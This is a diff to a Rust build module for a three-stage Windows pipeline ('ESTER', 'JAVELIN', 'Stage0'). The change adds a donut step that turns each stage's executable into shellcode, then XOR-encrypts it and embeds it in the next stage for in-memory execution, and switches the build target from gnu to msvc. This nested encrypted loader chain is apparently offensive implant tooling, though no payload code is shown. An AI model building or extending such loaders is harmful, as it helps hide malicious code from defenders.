@@ -1,11 +1,14 @@
 //! Multi-Stage Builder - Builds the complete ESTER → JAVELIN → Stage0 pipeline
 //!
 //! This module implements the iterative build process:
-//! 1. Compile Stage0 → Encrypt → Embed in JAVELIN source
-//! 2. Compile JAVELIN (with Stage0) → Encrypt → Embed in ESTER source
+//! 1. Compile Stage0 → Convert to shellcode (donut) → Encrypt → Embed in JAVELIN source
+//! 2. Compile JAVELIN (with Stage0) → Convert to shellcode (donut) → Encrypt → Embed in ESTER source
 //! 3. Compile ESTER (with JAVELIN) → Final executable
 //!
 //! Each stage is encrypted with a unique XOR key for security
+//! 
+//! **Key improvement**: Uses donut to convert EXEs to position-independent shellcode
+//! so they can be executed directly in memory without a PE loader.
 
 use crate::dll_encrypt::{generate_random_key, xor_encrypt};
 use std::fs;
@@ -75,7 +78,7 @@ fn build_stage0(config: &StageConfig) -> Result<Vec<u8>, Box<dyn std::error::Err
         .args(&[
             "build",
             "--release",
-            "--target", "x86_64-pc-windows-gnu",
+            "--target", "x86_64-pc-windows-msvc",
             "--package", "stage0",
             "--features", features,
         ])
@@ -86,7 +89,7 @@ fn build_stage0(config: &StageConfig) -> Result<Vec<u8>, Box<dyn std::error::Err
     }
     
     // Read the compiled binary
-    let binary_path = Path::new("target/x86_64-pc-windows-gnu/release/stage0.exe");
+    let binary_path = Path::new("target/x86_64-pc-windows-msvc/release/stage0.exe");
     let binary = fs::read(binary_path)?;
     
     Ok(binary)
@@ -160,7 +163,7 @@ fn build_javelin_with_stage0(
         .args(&[
             "build",
             "--release",
-            "--target", "x86_64-pc-windows-gnu",
+            "--target", "x86_64-pc-windows-msvc",
             "--package", "javelin",
             "--features", features,
         ])
@@ -171,7 +174,7 @@ fn build_javelin_with_stage0(
     }
     
     // Read the compiled binary
-    let binary_path = Path::new("target/x86_64-pc-windows-gnu/release/javelin.exe");
+    let binary_path = Path::new("target/x86_64-pc-windows-msvc/release/javelin.exe");
     let binary = fs::read(binary_path)?;
     
     Ok(binary)
@@ -369,7 +372,7 @@ fn build_ester_with_javelin(
         .args(&[
             "build",
             "--release",
-            "--target", "x86_64-pc-windows-gnu",
+            "--target", "x86_64-pc-windows-msvc",
             "--package", "ester",
             "--features", features,
         ])
@@ -380,7 +383,7 @@ fn build_ester_with_javelin(
     }
     
     // Copy to output directory
-    let source_path = Path::new("target/x86_64-pc-windows-gnu/release/ester.exe");
+    let source_path = Path::new("target/x86_64-pc-windows-msvc/release/ester.exe");
     let dest_path = config.output_dir.join("ester.exe");
     fs::copy(source_path, &dest_path)?;
     
